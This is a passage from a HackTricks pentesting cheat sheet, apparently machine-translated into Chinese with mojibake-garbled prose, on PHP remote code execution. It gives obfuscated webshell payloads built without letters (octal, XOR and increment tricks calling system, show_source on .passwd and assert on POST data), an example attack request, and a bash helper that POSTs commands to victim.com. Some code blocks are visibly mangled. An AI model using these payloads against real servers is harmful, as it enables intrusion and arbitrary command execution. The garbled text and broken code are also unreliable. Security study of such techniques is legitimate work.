PHPåŒ…è£…å™¨å’Œåè®®å¯ä»¥è®©æ‚¨**ç»•è¿‡ç³»ç»Ÿä¸­çš„å†™å…¥å’Œè¯»å–ä¿æŠ¤**ï¼Œå¹¶å¯¹å…¶è¿›è¡Œç ´åã€‚æœ‰å…³[**æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹æ­¤é¡µé¢**](../../../pentesting-web/file-inclusion/#lfi-rfi-using-php-wrappers-and-protocols)ã€‚

## Xdebugæœªç»èº«ä»½éªŒè¯çš„RCE

å¦‚æœæ‚¨å‘ç°`phpconfig()`è¾“å‡ºä¸­å¯ç”¨äº†**Xdebug**ï¼Œåˆ™åº”å°è¯•é€šè¿‡[https://github.com/nqxcode/xdebug-exploit](https://github.com/nqxcode/xdebug-exploit)è·å–RCEã€‚

## å˜é‡å˜é‡
```php
$x = 'Da';
$$x = 'Drums';

echo $x; //Da
echo $$x; //Drums
echo $Da; //Drums
echo "${Da}"; //Drums
echo "$x ${$x}"; //Da Drums
echo "$x ${Da}"; //Da Drums
```
## åˆ©ç”¨æ–°çš„ $\_GET\["a"]\($\_GET\["b"])

å¦‚æœåœ¨ä¸€ä¸ªé¡µé¢ä¸­**å¯ä»¥åˆ›å»ºä»»æ„ç±»çš„æ–°å¯¹è±¡**ï¼Œåˆ™å¯èƒ½èƒ½å¤Ÿè·å¾—RCEï¼Œè¯·æŸ¥çœ‹ä»¥ä¸‹é¡µé¢äº†è§£è¯¦æƒ…ï¼š

{% content-ref url="php-rce-abusing-object-creation-new-usd_get-a-usd_get-b.md" %}
[php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md](php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md)
{% endcontent-ref %}

## åœ¨ä¸ä½¿ç”¨å­—æ¯çš„æƒ…å†µä¸‹æ‰§è¡ŒPHP

[https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/)

### ä½¿ç”¨å…«è¿›åˆ¶
```php
$_="\163\171\163\164\145\155(\143\141\164\40\56\160\141\163\163\167\144)"; #system(cat .passwd);
```
### **å¼‚æˆ–ï¼ˆXORï¼‰**
```php
$_=("%28"^"[").("%33"^"[").("%34"^"[").("%2c"^"[").("%04"^"[").("%28"^"[").("%34"^"[").("%2e"^"[").("%29"^"[").("%38"^"[").("%3e"^"["); #show_source
$__=("%0f"^"!").("%2f"^"_").("%3e"^"_").("%2c"^"_").("%2c"^"_").("%28"^"_").("%3b"^"_"); #.passwd
$___=$__; #Could be not needed inside eval
$_($___); #If Â¢___ not needed then $_($__), show_source(.passwd)
```
### XORç®€æ˜“shellä»£ç 

æ ¹æ®[**è¿™ç¯‡è§£æ**](https://mgp25.com/ctf/Web-challenge/)ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼ç”Ÿæˆä¸€ä¸ªç®€å•çš„shellcodeï¼š
```php
$_="`{{{"^"?<>/"; // $_ = '_GET';
${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);

$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
```
æ‰€ä»¥ï¼Œå¦‚æœæ‚¨å¯ä»¥**æ‰§è¡Œä»»æ„PHPä»£ç è€Œä¸ä½¿ç”¨æ•°å­—å’Œå­—æ¯**ï¼Œæ‚¨å¯ä»¥å‘é€ç±»ä¼¼ä»¥ä¸‹æ»¥ç”¨è¯¥æœ‰æ•ˆè´Ÿè½½ä»¥æ‰§è¡Œä»»æ„PHPä»£ç çš„è¯·æ±‚ï¼š
```
POST: /action.php?_=system&__=cat+flag.php
Content-Type: application/x-www-form-urlencoded

comando=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
```
æ›´è¯¦ç»†çš„è§£é‡Šè¯·æŸ¥çœ‹[https://ctf-wiki.org/web/php/php/#preg\_match](https://ctf-wiki.org/web/php/php/#preg\_match)

### XOR Shellcodeï¼ˆåœ¨evalå†…éƒ¨ï¼‰
```bash
#!/bin/bash

if [[ -z $1 ]]; then
echo "USAGE: $0 CMD"
exit
fi

CMD=$1
CODE="\$_='\
```

```php
lt;>/'^'{{{{';\${\$_}[_](\${\$_}[__]);" `$_='
```

```php
lt;>/'^'{{{{'; --> _GET` `${$_}[_](${$_}[__]); --> $_GET[_]($_GET[__])` `So, the function is inside $_GET[_] and the parameter is inside $_GET[__]` http --form POST "http://victim.com/index.php?_=system&__=$CMD" "input=$CODE"
```
### Perl like

### ç±»ä¼¼Perl
```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```
<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

å…¶ä»–æ”¯æŒHackTricksçš„æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
